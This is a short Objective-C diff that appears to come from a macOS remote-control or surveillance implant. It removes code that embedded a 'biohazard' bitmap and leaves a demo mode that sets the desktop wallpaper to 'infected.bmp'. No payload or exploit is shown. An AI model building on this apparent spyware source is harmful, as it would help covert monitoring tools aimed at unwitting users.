@@ -45,7 +45,6 @@
 
 #import "NSApplication+SystemVersion.h"
 #import "NSMutableData+SHA1.h"
-#import "RCSMDesktopImage.h"
 
 #define ICON_FILENAME  @"q45tyh"
 
@@ -3031,25 +3030,15 @@ void lionSendEventToPid(pid_t pidP)
       
       if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
         {
-//        NSString *filePath = [[NSString alloc] initWithFormat: @"%@/bio.bmp",
-//                              NSHomeDirectory()];
-
           NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                                                  [[NSBundle mainBundle] bundlePath],
                                                                  @"infected.bmp"];
-                             
-          NSData *bmpData = [[NSData alloc] initWithBytes: biohazard_bmp
-                                                   length: biohazard_bmp_len];
           
-          [bmpData writeToFile: filePath atomically: YES];
-          
-          //changeDesktopBackground(filePath, FALSE);
           changeDesktopBg(filePath, NO);
           
           gIsDemoMode = YES;
           
           [filePath release];
-          [bmpData release];
       }    
     }
 }
